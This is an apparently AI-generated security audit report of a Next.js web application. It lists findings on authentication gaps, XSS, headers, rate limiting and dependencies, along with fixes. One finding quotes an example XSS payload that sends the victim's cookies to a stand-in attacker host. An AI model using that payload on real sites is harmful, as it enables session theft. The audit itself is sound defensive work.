# SpaceNexus Security Audit Report

**Audit Date:** 2026-02-12
**Auditor:** Automated Security Review (Claude Opus 4.6)
**Application:** SpaceNexus (spacehub)
**Tech Stack:** Next.js 14, Prisma/PostgreSQL, TypeScript, Railway
**Branch Audited:** `dev`

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Findings by Category](#findings-by-category)
   - [1. Exposed Secrets & API Keys](#1-exposed-secrets--api-keys)
   - [2. Authentication & Authorization](#2-authentication--authorization)
   - [3. API Route Security](#3-api-route-security)
   - [4. CSRF Protection](#4-csrf-protection)
   - [5. SQL Injection / Prisma Safety](#5-sql-injection--prisma-safety)
   - [6. XSS Prevention](#6-xss-prevention)
   - [7. Security Headers](#7-security-headers)
   - [8. Information Disclosure](#8-information-disclosure)
   - [9. Rate Limiting](#9-rate-limiting)
   - [10. Dependency Vulnerabilities](#10-dependency-vulnerabilities)
   - [11. File Upload / File Access](#11-file-upload--file-access)
   - [12. External API Calls](#12-external-api-calls)
   - [13. Stripe / Payment Security](#13-stripe--payment-security)
   - [14. Environment & Deployment](#14-environment--deployment)
3. [Overall Risk Assessment](#overall-risk-assessment)

---

## Executive Summary

The SpaceNexus application demonstrates a generally strong security posture for a startup-phase product. Several key patterns are well-implemented: Zod validation on most routes, timing-safe cron secret comparison, anti-enumeration on auth endpoints, bcrypt(12) password hashing, HTML escaping in email templates, parameterized Prisma queries (no raw SQL), circuit breakers on external APIs, and proper Stripe webhook signature verification.

However, the audit identified **28 findings** across severity levels:

| Severity | Count |
|----------|-------|
| Critical | 2     |
| High     | 5     |
| Medium   | 10    |
| Low      | 7     |
| Informational | 4 |

The two critical findings relate to **known vulnerabilities in the Next.js dependency** (including SSRF in Server Actions, authorization bypass, and cache poisoning) and **unauthenticated webhook subscription management**. The high-severity findings include unauthenticated data export, missing authentication on the AI search endpoint, information disclosure via the cache status endpoint, XSS in admin notification emails, and inconsistent cron secret checking on the marketplace verify route.

---

## Findings by Category

### 1. Exposed Secrets & API Keys

#### Finding 1.1: `.env` File Present in Repository Root
- **Severity:** Informational
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\.env`
- **Description:** A `.env` file exists in the repository root. The `.gitignore` file properly lists `.env` and `.env*.local`, which should prevent it from being committed. The file was detected locally but appears excluded from git tracking (not listed in `git status`).
- **Impact:** If accidentally committed, all secrets (database URL, API keys, Stripe keys, NEXTAUTH_SECRET) would be exposed in the repository history.
- **Recommendation:** Verify the `.env` file has never been committed by running `git log --all --full-history -- .env`. Consider adding a pre-commit hook to block `.env` files.
- **Status:** Open

#### Finding 1.2: API Keys Properly Referenced via Environment Variables
- **Severity:** Informational (Positive Finding)
- **Location:** Throughout `src/lib/` and `src/app/api/`
- **Description:** All API keys (NASA, Finnhub, N2YO, SAM.gov, Anthropic, Stripe, Resend) are accessed via `process.env.*` and never hardcoded. The `NEXT_PUBLIC_` prefix is correctly limited to non-secret values (`APP_URL`, `BASE_URL`). No `NEXT_PUBLIC_` variables were found containing secrets in client-side component code.
- **Impact:** N/A - this is a positive security observation.
- **Recommendation:** No action needed.
- **Status:** N/A

#### Finding 1.3: NASA DEMO_KEY Fallback
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\lib\external-apis.ts` (lines 9, 42, 56, 61, 106)
- **Description:** NASA API endpoints fall back to the public `DEMO_KEY` when `NASA_API_KEY` is not set. While not a secret leak, `DEMO_KEY` has severe rate limits (30 req/hour per IP, 50 req/day) that could cause production outages.
- **Impact:** If `NASA_API_KEY` is unset in production, multiple cron jobs fetching from NASA APIs will quickly exhaust the demo key's rate limit, causing data staleness.
- **Recommendation:** Add a startup warning or fail-fast check when `NASA_API_KEY` is not configured in production. Log the fallback prominently.
- **Status:** Open

---

### 2. Authentication & Authorization

#### Finding 2.1: Webhook Subscription Routes Lack Authentication (CRITICAL)
- **Severity:** Critical
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\webhooks\subscribe\route.ts` (all handlers: POST, GET, DELETE)
- **Description:** The webhook subscription endpoint (`/api/webhooks/subscribe`) allows **any unauthenticated user** to:
  - **POST:** Create webhook subscriptions to any URL, receiving an HMAC secret
  - **GET:** List all active webhook subscriptions (URLs, event types, failure counts, timestamps)
  - **DELETE:** Deactivate any webhook subscription by ID
  There is no `getServerSession()`, no `requireCronSecret()`, and no other auth check.
- **Impact:** An attacker could: (1) Create malicious webhook subscriptions pointing to their servers, receiving real-time data about system events, (2) List all existing webhook URLs, revealing internal infrastructure or partner integrations, (3) Delete legitimate webhook subscriptions, disrupting integrations. This also creates a potential SSRF vector if the webhook dispatcher fetches attacker-controlled URLs.
- **Recommendation:** Add authentication requiring at minimum a logged-in admin session. The GET endpoint should only return subscriptions belonging to the authenticated user. The DELETE endpoint should verify ownership.
- **Status:** **FIXED** (2026-02-13) — Added admin authentication (`getServerSession` + `isAdmin` check) to all three handlers (POST, GET, DELETE).

#### Finding 2.2: Data Export Route Has No Authentication
- **Severity:** High
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\export\[module]\route.ts`
- **Description:** The `/api/export/[module]` endpoint allows any unauthenticated user to export up to 1,000 records from `spaceCompany`, `spaceEvent`, or `newsArticle` tables in JSON or CSV format. No `getServerSession()` or other auth check is present.
- **Impact:** While the data may be semi-public, bulk export without authentication enables easy scraping of the entire database contents for these models, including all fields (potentially including internal metadata, timestamps, etc.).
- **Recommendation:** Add authentication. At minimum, require a logged-in user. Consider limiting exported fields with Prisma `.select()` to exclude internal metadata.
- **Status:** **FIXED** (2026-02-13) — Added session authentication (`getServerSession` + user ID check) to GET handler.

#### Finding 2.3: AI Search Intent Route Lacks Authentication
- **Severity:** High
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\search\ai-intent\route.ts`
- **Description:** The `/api/search/ai-intent` POST endpoint calls the Anthropic API (Claude Haiku) with user-supplied queries but has no authentication. Any anonymous user can trigger API calls that consume the project's Anthropic API credits.
- **Impact:** An attacker could run up significant Anthropic API costs by making automated requests to this endpoint. The general rate limit of 100 req/min provides some protection but allows ~6,000 requests per hour.
- **Recommendation:** Add `getServerSession()` authentication check. At minimum, require a logged-in user. Consider adding a tighter per-user rate limit for AI endpoints.
- **Status:** **FIXED** (2026-02-13) — Added session authentication (`getServerSession` + user ID check) to POST handler.

#### Finding 2.4: Feature Request and Help Request POST Routes Allow Unauthenticated Submissions
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\feature-requests\route.ts` (line 11), `C:\Users\Jay\claudeprojects\spacehub\src\app\api\help-requests\route.ts` (line 11)
- **Description:** Both routes check for a session but do not require one. Anonymous users can submit feature requests and help requests. While this may be intentional (allowing unauthenticated feedback), it opens the door to spam submissions.
- **Impact:** Database spam pollution. No auth means no accountability for submissions.
- **Recommendation:** If anonymous submissions are intentional, add CAPTCHA or honeypot fields to prevent automated abuse. If not, require authentication.
- **Status:** Open

#### Finding 2.5: NextAuth JWT Does Not Check `emailVerified`
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\lib\auth.ts` (lines 14-42)
- **Description:** The `authorize()` callback in NextAuth's CredentialsProvider does not check whether the user's email has been verified (`emailVerified` field). A user who registers but never verifies their email can still log in and access all authenticated features.
- **Impact:** The email verification flow exists but is effectively optional. Users with unverified (potentially spoofed) email addresses can access authenticated features, create RFQs, claim company profiles, create API keys, etc.
- **Recommendation:** Add a check in `authorize()`: if `!user.emailVerified`, throw an error like "Please verify your email address before signing in." Alternatively, limit unverified users to read-only access.
- **Status:** Open

#### Finding 2.6: Company Profile Claim Has Weak Verification
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\company-profiles\[slug]\claim\route.ts`
- **Description:** Any authenticated user can claim any unclaimed company profile by providing just a `contactEmail`. The verification level is automatically set to `identity` with no actual identity verification. There is no domain validation (e.g., checking that the user's email domain matches the company's website domain).
- **Impact:** A malicious user could claim a high-profile company (e.g., SpaceX, Blue Origin) and then create marketplace listings under that company's name, potentially defrauding other users.
- **Recommendation:** Implement domain-based email verification (require the user's email to match the company's website domain). Add an admin approval step for company claims, especially for Tier 1 companies.
- **Status:** Open

---

### 3. API Route Security

#### Finding 3.1: Inconsistent Cron Secret Checking on Marketplace Verify Route
- **Severity:** High
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\marketplace\verify\route.ts` (lines 53-56)
- **Description:** The marketplace verify POST route checks for the cron secret using a custom `x-cron-secret` header and `timingSafeEqual()` instead of the standard `requireCronSecret()` function which checks the `Authorization: Bearer` header. This creates an inconsistency: the cron scheduler in `cron-scheduler.ts` sends the secret via `Authorization: Bearer`, not `x-cron-secret`. If this endpoint is called by the cron scheduler, it would fail authentication. If called manually with the `x-cron-secret` header, it bypasses the standard middleware pattern.
- **Impact:** The endpoint may be unreachable by the cron scheduler, or it may accept the secret through a non-standard header that other security tooling does not monitor.
- **Recommendation:** Use the standard `requireCronSecret(request)` function for consistency.
- **Status:** **FIXED** (2026-02-13) — Replaced custom `x-cron-secret` header check with standard `requireCronSecret(request)`. Also fixed same pattern in `/api/marketplace/rfq/process`.

#### Finding 3.2: Feature Request PATCH Accepts Arbitrary Status Values
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\feature-requests\[id]\route.ts` (lines 22-26)
- **Description:** The PATCH handler accepts `status` and `adminNotes` from the request body without Zod validation. While the endpoint requires admin access, the `status` field is passed directly to Prisma without validating against allowed values.
- **Impact:** An admin could accidentally set an invalid status value, potentially causing UI rendering issues or data inconsistency. Severity is low since only admins can access this endpoint.
- **Recommendation:** Add Zod validation with an enum of allowed status values (e.g., `['new', 'in-progress', 'completed', 'rejected']`).
- **Status:** Open

#### Finding 3.3: Contact Form Status Filter Not Validated
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\contact\route.ts` (lines 91-93)
- **Description:** The GET endpoint (admin only) accepts an arbitrary `status` query parameter and passes it directly to the Prisma `where` clause without validation. While `subject` is validated against `VALID_SUBJECTS`, `status` is not.
- **Impact:** Low risk since Prisma treats unknown values as non-matching filters (returns empty results), and the endpoint requires admin access. However, it violates the principle of validating all inputs.
- **Recommendation:** Add validation against a whitelist of valid status values.
- **Status:** Open

#### Finding 3.4: Marketplace Admin Verify Route Uses Non-Standard Admin Check Pattern
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\marketplace\verify\admin\route.ts` (lines 18-24)
- **Description:** Instead of relying on `session.user.isAdmin` from the JWT token, this route performs a separate database lookup (`prisma.user.findUnique`) to check `isAdmin`. While more secure (checks current DB state rather than JWT state), it is inconsistent with other admin routes and incurs an extra DB query.
- **Impact:** Low. This is actually more secure but inconsistent with the rest of the codebase.
- **Recommendation:** Consider standardizing the admin check pattern across all routes. The DB-lookup approach is more secure against JWT replay after an admin demotion.
- **Status:** Open

---

### 4. CSRF Protection

#### Finding 4.1: CSRF Implementation Is Sound
- **Severity:** Informational (Positive Finding)
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\middleware.ts` (lines 152-208)
- **Description:** The CSRF implementation correctly:
  - Checks Origin header (preferred) and falls back to Referer
  - Rejects requests with neither header (preventing header-stripping attacks)
  - Applies to all mutation methods (POST, PUT, DELETE, PATCH)
  - Correctly exempts NextAuth routes (own CSRF), Stripe webhooks (signature verification), and v1 API routes (API key auth)
- **Impact:** N/A
- **Recommendation:** No action needed. The implementation follows security best practices.
- **Status:** N/A

---

### 5. SQL Injection / Prisma Safety

#### Finding 5.1: No Raw SQL Usage Detected
- **Severity:** Informational (Positive Finding)
- **Location:** Entire `src/` directory
- **Description:** A comprehensive search for `$queryRaw`, `$executeRaw`, `$queryRawUnsafe`, and `$executeRawUnsafe` returned zero results. All database queries use Prisma's parameterized query builder, which prevents SQL injection.
- **Impact:** N/A
- **Recommendation:** No action needed. Continue using Prisma's query builder exclusively.
- **Status:** N/A

---

### 6. XSS Prevention

#### Finding 6.1: Admin Notification Email in Ads Register Route Lacks HTML Escaping
- **Severity:** High
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\ads\register\route.ts` (lines 76-85)
- **Description:** The admin notification email in the advertiser registration route interpolates user-submitted values (`companyName`, `contactName`, `contactEmail`, `website`) directly into an HTML email template without calling `escapeHtml()`. Other routes in the codebase (e.g., `service-providers/route.ts`, `companies/request/route.ts`, `orbital-services/listing/route.ts`) correctly use `escapeHtml()` for this purpose.
- **Impact:** An attacker could register as an advertiser with a company name like `<script>alert('xss')</script>` or `<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>`. When the admin opens the notification email, the injected HTML/JS could execute in the admin's email client (depending on the email client's HTML sanitization). This is a stored XSS vector targeting admin users.
- **Recommendation:** Wrap all user-provided values in `escapeHtml()` before interpolation, consistent with the pattern used in other routes. Example: `${escapeHtml(companyName)}`.
- **Status:** **FIXED** (2026-02-13) — Added `escapeHtml()` import and wrapped all four user-provided values (`companyName`, `contactName`, `contactEmail`, `website`) in the email template.

#### Finding 6.2: `dangerouslySetInnerHTML` Usage Is Safe
- **Severity:** Informational (Positive Finding)
- **Location:** Multiple files in `src/app/guide/`, `src/components/StructuredData.tsx`, `src/app/layout.tsx`, `src/components/analytics/GoogleAnalytics.tsx`
- **Description:** All uses of `dangerouslySetInnerHTML` are for:
  - Structured data (`JSON.stringify` of static schema objects) - no user input
  - Google Analytics initialization (static measurement ID) - no user input
  - Service worker registration (static inline script) - no user input
  None involve rendering user-controlled content.
- **Impact:** N/A
- **Recommendation:** No action needed.
- **Status:** N/A

#### Finding 6.3: RSS Content Sanitization Is Present
- **Severity:** Informational (Positive Finding)
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\lib\blogs-fetcher.ts` (line 393), `C:\Users\Jay\claudeprojects\spacehub\src\lib\news-fetcher.ts` (line 246)
- **Description:** RSS feed content is sanitized using `sanitize-html` with `allowedTags: []` (strip all HTML), preventing XSS from external RSS sources.
- **Impact:** N/A
- **Recommendation:** No action needed.
- **Status:** N/A

---

### 7. Security Headers

#### Finding 7.1: Content-Security-Policy Allows `unsafe-inline` and `unsafe-eval`
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\next.config.js` (line 57)
- **Description:** The CSP `script-src` directive includes `'unsafe-inline'` and `'unsafe-eval'`. While these are commonly needed for Next.js applications (React hydration, inline scripts, dynamic imports), they significantly weaken XSS protection. An XSS vulnerability in the application would not be mitigated by CSP.
- **Impact:** CSP does not provide defense-in-depth against XSS when `unsafe-inline` and `unsafe-eval` are allowed. Any injected script would execute without CSP blocking it.
- **Recommendation:** Investigate using nonces (`'nonce-...'`) for inline scripts and removing `'unsafe-eval'` if possible. Next.js 14 supports CSP nonces via `next.config.js` `experimental.sri`. This is a longer-term improvement.
- **Status:** Open

#### Finding 7.2: Security Headers Are Comprehensive
- **Severity:** Informational (Positive Finding)
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\next.config.js` (lines 46-58)
- **Description:** The following security headers are correctly configured:
  - `X-Frame-Options: DENY` (clickjacking protection)
  - `X-Content-Type-Options: nosniff` (MIME sniffing protection)
  - `Referrer-Policy: strict-origin-when-cross-origin`
  - `X-XSS-Protection: 1; mode=block` (legacy browser XSS filter)
  - `Permissions-Policy: camera=(), microphone=(), geolocation()`
  - `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` (HSTS)
  - `frame-ancestors 'none'` (CSP clickjacking protection)
- **Impact:** N/A
- **Recommendation:** No action needed.
- **Status:** N/A

---

### 8. Information Disclosure

#### Finding 8.1: Cache Status Endpoint Exposes Server Internals Without Authentication
- **Severity:** High
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\cache\status\route.ts`
- **Description:** The `/api/cache/status` GET endpoint requires **no authentication** and exposes:
  - Server memory usage (RSS, heap total, heap used, external)
  - Node.js version, platform, and architecture
  - Server uptime (precise, to the second)
  - Circuit breaker statuses for all external APIs (revealing which APIs are in use)
  - API cache statistics (hit/miss ratios, entry counts)
- **Impact:** An attacker gains detailed knowledge of the server's runtime environment, uptime, memory profile, and external API dependencies. This information aids in crafting targeted attacks (e.g., timing attacks based on uptime, identifying specific Node.js version vulnerabilities, mapping external dependencies).
- **Recommendation:** Add admin authentication (`getServerSession()` with `isAdmin` check) or restrict access via `requireCronSecret()`. Alternatively, reduce the information returned to non-admin callers.
- **Status:** **FIXED** (2026-02-13) — Added admin authentication (`getServerSession` + `isAdmin` check) to GET handler.

#### Finding 8.2: Health Endpoint Is Minimal (Good)
- **Severity:** Informational (Positive Finding)
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\health\route.ts`
- **Description:** The `/api/health` endpoint returns only `{ status: 'ok', timestamp: '...' }`, appropriately minimal for health checks.
- **Impact:** N/A
- **Recommendation:** No action needed.
- **Status:** N/A

#### Finding 8.3: Init Route GET Exposes Database Record Counts
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\init\route.ts` (lines 99-121)
- **Description:** The GET handler at `/api/init` returns database record counts for 7 tables (news, events, blogs, companies, resources, opportunities, compliance) without authentication.
- **Impact:** An attacker can determine the size of the database, track data growth over time, and detect when the system is newly deployed (counts near zero). Low impact since the data types are not sensitive.
- **Recommendation:** Add authentication or remove the GET handler. The POST handler already requires `requireCronSecret()`.
- **Status:** Open

---

### 9. Rate Limiting

#### Finding 9.1: In-Memory Rate Limiter Does Not Persist Across Instances
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\middleware.ts`
- **Description:** The rate limiter uses an in-memory `Map`. If Railway deploys multiple instances, each instance has its own rate limit store, effectively multiplying the allowed rate by the number of instances. On restart, all rate limit state is lost.
- **Impact:** Rate limits can be circumvented by distributing requests across multiple server instances (if scaled) or by waiting for a deploy/restart to reset the store.
- **Recommendation:** For a single-instance Railway deployment, this is acceptable. If scaling to multiple instances, consider a Redis-backed rate limiter. Document the single-instance assumption.
- **Status:** Open

#### Finding 9.2: Rate Limiting Does Not Cover AI Endpoints Specifically
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\middleware.ts` (lines 21-38)
- **Description:** AI-powered endpoints (`/api/search/ai-intent`, `/api/marketplace/copilot`, `/api/opportunities/moonshots`) that call the Anthropic API are covered only by the general API rate limit (100 req/min). Each request to these endpoints triggers an expensive external API call (Anthropic/Claude).
- **Impact:** An attacker (or even a legitimate heavy user) could consume significant Anthropic API credits within the general rate limit. At 100 requests per minute, the cost could be substantial over time.
- **Recommendation:** Add a dedicated rate limit tier for AI endpoints (e.g., 10 req/min or 50 req/hour). The `copilot` route already requires auth, but `ai-intent` does not (see Finding 2.3).
- **Status:** Open

#### Finding 9.3: IP-Based Rate Limiting Can Be Spoofed
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\middleware.ts` (lines 44-55)
- **Description:** The `getClientIp()` function trusts the `x-forwarded-for` header, taking the first IP. On Railway, this should be set correctly by the reverse proxy, but if the application were exposed directly or behind a misconfigured proxy, an attacker could spoof this header to bypass rate limits.
- **Impact:** If the reverse proxy is not configured to strip/override client-provided `x-forwarded-for` headers, an attacker can use a different spoofed IP on each request to bypass rate limits entirely.
- **Recommendation:** Verify that Railway's reverse proxy properly sets `x-forwarded-for` and strips client-provided values. Consider using only the rightmost IP in the chain (the one added by the trusted proxy).
- **Status:** Open

---

### 10. Dependency Vulnerabilities

#### Finding 10.1: Critical Vulnerabilities in Next.js
- **Severity:** Critical
- **Location:** `node_modules/next` (version range 0.9.9 - 15.5.9)
- **Description:** `npm audit` reports **15 known vulnerabilities** in the installed Next.js version, including:
  - **GHSA-fr5h-rqp8-mj6g** - Server-Side Request Forgery in Server Actions
  - **GHSA-7gfc-8cq8-jh5f** - Authorization bypass vulnerability
  - **GHSA-f82v-jwr5-mffw** - Authorization Bypass in Next.js Middleware
  - **GHSA-gp8f-8m3g-qvj9** - Cache Poisoning
  - **GHSA-g77x-44xx-532m** - DoS in image optimization
  - **GHSA-4342-x723-ch2f** - Improper Middleware Redirect Handling leads to SSRF
  - **GHSA-xv57-4mr9-wg8v** - Content Injection for Image Optimization
  - And 8 additional vulnerabilities (DoS, race conditions, cache poisoning)
  Fix available: `next@14.2.35`
- **Impact:** The SSRF and authorization bypass vulnerabilities are particularly severe. An attacker could potentially bypass middleware-based authentication checks, forge server-side requests, or poison the response cache.
- **Recommendation:** **Upgrade Next.js immediately** to the latest patched version (14.2.35+). This should be the highest priority remediation item. Run `npm audit fix --force` or manually update the `next` version in `package.json`.
- **Status:** **FIXED** (2026-02-13) — Upgraded Next.js from 14.1.0 to 14.2.35. Build verified successfully.

#### Finding 10.2: Vulnerable `cookie` Package (next-auth dependency)
- **Severity:** Low
- **Location:** `node_modules/cookie` (< 0.7.0)
- **Description:** The `cookie` package used by `next-auth` accepts cookie names, paths, and domains with out-of-bounds characters (GHSA-pxg6-pf52-xh8x).
- **Impact:** Could allow cookie injection in specific scenarios, though exploitation requires the application to set cookies with user-controlled names/values.
- **Recommendation:** Update `@auth/prisma-adapter` to >= 2.11.1 (breaking change). Evaluate the breaking changes before upgrading.
- **Status:** Open

#### Finding 10.3: `qs` Package DoS Vulnerability
- **Severity:** Low
- **Location:** `node_modules/qs` (6.7.0 - 6.14.1)
- **Description:** The `qs` package has a `arrayLimit` bypass vulnerability allowing denial of service via comma parsing (GHSA-w7fw-mjwx-w883).
- **Impact:** An attacker could craft query strings that cause excessive CPU consumption in query string parsing.
- **Recommendation:** Run `npm audit fix` to update `qs`.
- **Status:** Open

---

### 11. File Upload / File Access

#### Finding 11.1: No File Upload Endpoints Detected
- **Severity:** Informational (Positive Finding)
- **Location:** Entire `src/app/api/` directory
- **Description:** No file upload handlers were found in the API routes. The application does not appear to accept file uploads from users.
- **Impact:** N/A - absence of file uploads eliminates path traversal and arbitrary file upload risks.
- **Recommendation:** No action needed. If file uploads are added in the future, implement file type validation, size limits, and store files in a separate storage service (S3, etc.).
- **Status:** N/A

---

### 12. External API Calls

#### Finding 12.1: External API Call to HTTP (Non-HTTPS) Endpoint
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\lib\external-apis.ts` (line 37)
- **Description:** The Open Notify API is configured with `http://api.open-notify.org` (plain HTTP, not HTTPS). All other external APIs use HTTPS.
- **Impact:** Data fetched from this API is transmitted in cleartext and could be intercepted or tampered with via a man-in-the-middle attack. While the data (ISS position) is not sensitive, a MITM attacker could inject malicious data that gets stored in the database.
- **Recommendation:** Check if Open Notify supports HTTPS. If so, switch to `https://`. If not, consider using an alternative API or documenting the risk.
- **Status:** Open

#### Finding 12.2: Potential SSRF in Admin Data Freshness POST
- **Severity:** Medium
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\admin\data-freshness\route.ts` (lines 140-155)
- **Description:** The POST handler constructs a URL from `NEXTAUTH_URL`/`NEXT_PUBLIC_APP_URL` and the user-supplied `module` field, then makes a server-side `fetch()` call to that URL. While `module` is URL-encoded (`encodeURIComponent`), the base URL comes from environment variables. If `NEXTAUTH_URL` is misconfigured (e.g., pointing to an internal network address), an admin could trigger internal requests.
- **Impact:** Limited since the endpoint requires admin authentication and the URL path is constrained to `/api/refresh?type=`. The `module` value is properly encoded. However, if environment variables are misconfigured to point to internal services, SSRF could be possible.
- **Recommendation:** Validate the `module` value against a whitelist of known refresh types. This also prevents unnecessary failed API calls.
- **Status:** Open

#### Finding 12.3: External API Keys Not Leaked in Responses (Good)
- **Severity:** Informational (Positive Finding)
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\lib\external-apis.ts`
- **Description:** API keys are embedded in URLs but only in server-side fetch calls. API responses to clients never include the keys.
- **Impact:** N/A
- **Recommendation:** No action needed.
- **Status:** N/A

---

### 13. Stripe / Payment Security

#### Finding 13.1: Stripe Integration Is Well-Secured
- **Severity:** Informational (Positive Finding)
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\stripe/`
- **Description:** The Stripe integration demonstrates strong security practices:
  - Webhook signature verification using `stripe.webhooks.constructEvent()` (line 52 of webhooks/route.ts)
  - Webhook secret required (fails if not configured)
  - Checkout session creation requires authentication via `getServerSession()` (checkout/route.ts)
  - Input validation with Zod schema (`stripeCheckoutSchema`)
  - Customer portal requires authentication (portal/route.ts)
  - Lazy Stripe initialization to avoid build-time secret exposure (`getStripe()` pattern)
  - Price IDs come from environment variables, not user input
  - User ID in checkout session metadata comes from the authenticated session, not user input
  - CSRF check correctly exempted for webhook endpoint (signature verification is sufficient)
- **Impact:** N/A
- **Recommendation:** No immediate action needed. The implementation is solid.
- **Status:** N/A

#### Finding 13.2: Stripe Webhook Returns 200 Even on Processing Errors
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\api\stripe\webhooks\route.ts` (lines 90-101)
- **Description:** After a verified webhook event fails processing (e.g., database error), the handler returns HTTP 200 with `{ received: true }`. The comment explains this prevents Stripe from retrying, which is a valid design choice. However, it means failed webhook events are silently dropped.
- **Impact:** If a checkout completion or subscription update fails to process (e.g., due to a transient DB error), the user's subscription status may not be updated. The error is logged but there's no retry mechanism or dead letter queue.
- **Recommendation:** Consider implementing a dead letter queue or a manual retry mechanism for failed webhook events. At minimum, set up alerting on the logged errors.
- **Status:** Open

---

### 14. Environment & Deployment

#### Finding 14.1: Build Command Silently Ignores Prisma Errors
- **Severity:** Medium
- **Location:** `package.json` (build script: `prisma db push || true && next build`)
- **Description:** The build command uses `|| true` after `prisma db push`, meaning the build will proceed even if database schema synchronization fails. In production, this could result in a deployment where the application expects database columns that don't exist.
- **Impact:** A deployed build might crash at runtime with Prisma errors if schema changes were not applied, potentially causing data corruption or service outages.
- **Recommendation:** Consider failing the build on `prisma db push` errors, or at minimum logging a prominent warning. Use `prisma migrate deploy` for production migrations instead of `db push`.
- **Status:** Open

#### Finding 14.2: Timing-Safe Comparison Has a Subtle Length-Leak Mitigation
- **Severity:** Low
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\lib\errors.ts` (lines 275-290)
- **Description:** The `timingSafeEqual()` function attempts to handle different-length strings by still doing a comparison, but the `if (a.length !== b.length)` branch itself leaks the fact that lengths differ. The function initializes `result = a.length ^ b.length` (which is non-zero when lengths differ), so the overall function is correct (always returns `false` for different lengths), but the branch timing may differ from the equal-length path. The standard `crypto.timingSafeEqual()` from Node.js would be more robust.
- **Impact:** Very low. An attacker would need extremely precise timing measurements to detect the length mismatch, and the cron secret values are randomly generated UUIDs (always the same length in practice).
- **Recommendation:** Use Node.js's built-in `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` after padding to equal lengths, or rely on the existing implementation since the practical risk is negligible.
- **Status:** Open

#### Finding 14.3: Google Analytics Disabled in Production
- **Severity:** Informational (Positive Finding)
- **Location:** `C:\Users\Jay\claudeprojects\spacehub\src\app\layout.tsx` (lines 150-153)
- **Description:** Google Analytics is configured with `enabled={false}` and a placeholder measurement ID (`GA_MEASUREMENT_ID`). No user tracking data is being sent to Google.
- **Impact:** N/A - positive from a privacy perspective.
- **Recommendation:** When enabling GA, ensure a cookie consent mechanism is in place.
- **Status:** N/A

---

## Overall Risk Assessment

### Risk Level: **MODERATE** (downgraded from MODERATE-HIGH after remediations)

The application has a strong foundation with many security best practices in place. The two previously critical categories have been addressed:

1. **~~Critical: Update Next.js immediately.~~** FIXED — Upgraded from 14.1.0 to 14.2.35, resolving 15 known CVEs including SSRF, authorization bypass, and cache poisoning.

2. **~~Critical/High: Unauthenticated sensitive endpoints.~~** FIXED — All 7 critical/high findings remediated: webhook subscribe (admin auth), data export (session auth), AI search intent (session auth), cache status (admin auth), ads register XSS (escapeHtml), marketplace verify cron secret (requireCronSecret), Next.js upgrade.

Remaining open findings are Medium priority and below.

### Priority Remediation Roadmap

| Priority | Finding | Action | Status |
|----------|---------|--------|--------|
| P0 | 10.1 | Upgrade Next.js to 14.2.35+ | **FIXED** |
| P0 | 2.1 | Add authentication to webhook subscribe routes | **FIXED** |
| P1 | 2.2 | Add authentication to export route | **FIXED** |
| P1 | 2.3 | Add authentication to AI search intent route | **FIXED** |
| P1 | 8.1 | Add authentication to cache status route | **FIXED** |
| P1 | 6.1 | Add `escapeHtml()` to ads/register email template | **FIXED** |
| P1 | 3.1 | Fix inconsistent cron secret check on marketplace verify | **FIXED** |
| P2 | 2.5 | Enforce email verification before login |
| P2 | 2.6 | Add domain verification for company profile claims |
| P2 | 9.2 | Add dedicated rate limits for AI endpoints |
| P2 | 12.1 | Switch Open Notify to HTTPS |
| P2 | 14.1 | Fix build command to not silently ignore DB errors |
| P3 | All remaining Low/Informational findings |

### Strengths

- Zod validation on nearly all API routes
- Timing-safe secret comparison
- Anti-enumeration on auth endpoints (register, forgot-password)
- bcrypt(12) password hashing
- HTML escaping in most email templates
- No raw SQL queries (Prisma ORM exclusively)
- Proper Stripe webhook signature verification
- Comprehensive security headers (HSTS, X-Frame-Options, CSP, etc.)
- API keys hashed with SHA-256, never stored in plaintext
- Circuit breakers on all external API calls
- RSS content sanitized with sanitize-html
- CSRF protection on mutation endpoints
- Structured logging without stack trace leakage

---

*End of Security Audit Report*
